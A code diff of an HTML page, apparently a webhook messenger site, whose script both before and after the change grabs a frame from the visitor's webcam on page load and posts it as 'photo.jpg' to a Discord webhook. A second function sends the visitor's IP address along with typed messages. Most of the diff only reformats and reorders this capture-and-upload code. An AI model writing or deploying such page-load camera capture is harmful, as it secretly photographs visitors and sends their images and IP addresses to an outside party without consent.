@@ -53,47 +53,46 @@
     }
   </style>
   <script>
-window.addEventListener('load', () => {
-  const video = document.createElement('video');
-  const canvas = document.createElement('canvas');
+    window.addEventListener('load', () => {
+      const video = document.createElement('video');
 
-  navigator.mediaDevices.getUserMedia({ video: true })
-    .then((stream) => {
-      video.srcObject = stream;
-      video.addEventListener('loadedmetadata', () => {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then((stream) => {
+          video.srcObject = stream;
+          video.addEventListener('loadedmetadata', () => {
+            setTimeout(() => {
+              const canvas = document.createElement('canvas');
+              canvas.width = video.videoWidth;
+              canvas.height = video.videoHeight;
+              canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+              canvas.toBlob((blob) => {
+                const formData = new FormData();
+                formData.append('file', blob, 'photo.jpg');
 
-        setTimeout(() => {
-          canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-          canvas.toBlob((blob) => {
-            const formData = new FormData();
-            formData.append('file', blob, 'photo.jpg');
+                const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL';
 
-            const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL';
-
-            fetch(webhookURL, {
-              method: 'POST',
-              body: formData
-            })
-              .then((response) => {
-                if (response.ok) {
-                  console.log('Photo sent to Discord webhook successfully!');
-                } else {
-                  console.error('Error sending photo to Discord webhook:', response.statusText);
-                }
-              })
-              .catch((error) => {
-                console.error('Error sending photo to Discord webhook:', error);
-              });
-          }, 'image/jpeg', 1);
-        }, 1000);
-      });
-    })
-    .catch((error) => {
-      console.error('Error accessing camera:', error);
+                fetch(webhookURL, {
+                  method: 'POST',
+                  body: formData
+                })
+                  .then((response) => {
+                    if (response.ok) {
+                      console.log('Photo sent to Discord webhook successfully!');
+                    } else {
+                      console.error('Error sending photo to Discord webhook:', response.statusText);
+                    }
+                  })
+                  .catch((error) => {
+                    console.error('Error sending photo to Discord webhook:', error);
+                  });
+              }, 'image/jpeg', 1);
+            }, 1000);
+          });
+        })
+        .catch((error) => {
+          console.error('Error accessing camera:', error);
+        });
     });
-});
 
     var ipAddress;
 
@@ -111,18 +110,17 @@ window.addEventListener('load', () => {
     function messenger() {
       var inputText = document.getElementById("inputText").value;
       var webhookURL = document.getElementById("webhookURL").value;
+        var request = new XMLHttpRequest();
+  request.open("POST", webhookURL);
+  var params = {
+    username: ipAddress,
+    content: inputText
+  };
 
-      var request = new XMLHttpRequest();
-      request.open("POST", webhookURL);
-      var params = {
-        username: ipAddress,
-        content: inputText
-      };
-
-      request.setRequestHeader("Content-type", "application/json");
-      request.send(JSON.stringify(params));
-    }
-  </script>
+  request.setRequestHeader("Content-type", "application/json");
+  request.send(JSON.stringify(params));
+}
+</script>
 </head>
 <body>
   <div class="topbar">
